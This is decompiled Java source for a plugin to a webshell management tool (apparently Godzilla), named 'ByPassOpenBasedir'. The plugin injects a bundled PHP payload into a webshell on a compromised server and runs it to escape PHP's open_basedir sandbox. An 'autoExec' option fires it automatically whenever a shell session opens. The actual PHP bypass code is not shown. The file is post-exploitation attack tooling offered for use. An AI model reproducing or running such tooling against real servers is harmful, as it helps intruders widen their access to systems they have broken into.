/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.php;

import core.Db;
import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.dialog.GOptionPane;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JPanel;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(payloadName="PhpDynamicPayload", Name="ByPassOpenBasedir", DisplayName="ByPassOpenBasedir")
public class ByPassOpenBasedir
implements Plugin {
    private static final String CLASS_NAME = "plugin.ByPassOpenBasedir";
    private static final String APP_ENV_KEY = "AutoExecByPassOpenBasedir";
    private final JPanel panel = new JPanel();
    private final JCheckBox autoExec;
    private final JButton bybassButton = new JButton("ByPassOpenBasedir");
    private boolean loadState;
    private ShellEntity shell;
    private Payload payload;
    private Encoding encoding;

    public ByPassOpenBasedir() {
        this.autoExec = new JCheckBox("autoExec");
        boolean autoExecBoolean = false;
        if ("true".equals(Db.getSetingValue(APP_ENV_KEY))) {
            autoExecBoolean = true;
        }
        this.autoExec.setSelected(autoExecBoolean);
        this.autoExec.addActionListener(new ActionListener(){

            @Override
            public void actionPerformed(ActionEvent paramActionEvent) {
                boolean autoExecBoolean = ByPassOpenBasedir.this.autoExec.isSelected();
                Db.updateSetingKV(ByPassOpenBasedir.APP_ENV_KEY, Boolean.toString(autoExecBoolean));
            }
        });
        this.panel.add(this.bybassButton);
        this.panel.add(this.autoExec);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override
    public JPanel getView() {
        return this.panel;
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/ByPassOpenBasedir.php");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success", new Object[0]);
                } else {
                    Log.log("Load fail", new Object[0]);
                }
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    private void bybassButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            this.load();
        }
        if (this.loadState) {
            byte[] result = this.payload.evalFunc(CLASS_NAME, "run", new ReqParameter());
            String resultString = this.encoding.Decoding(result);
            Log.log(resultString, new Object[0]);
            GOptionPane.showMessageDialog(null, resultString, "\u63d0\u793a", 1);
        } else {
            Log.error("load ByPassOpenBasedir fail!");
        }
    }

    @Override
    public void init(ShellEntity arg0) {
        this.shell = arg0;
        this.payload = arg0.getPayloadModule();
        this.encoding = Encoding.getEncoding(arg0);
        if (this.autoExec.isSelected()) {
            this.bybassButtonClick(null);
        }
    }
}

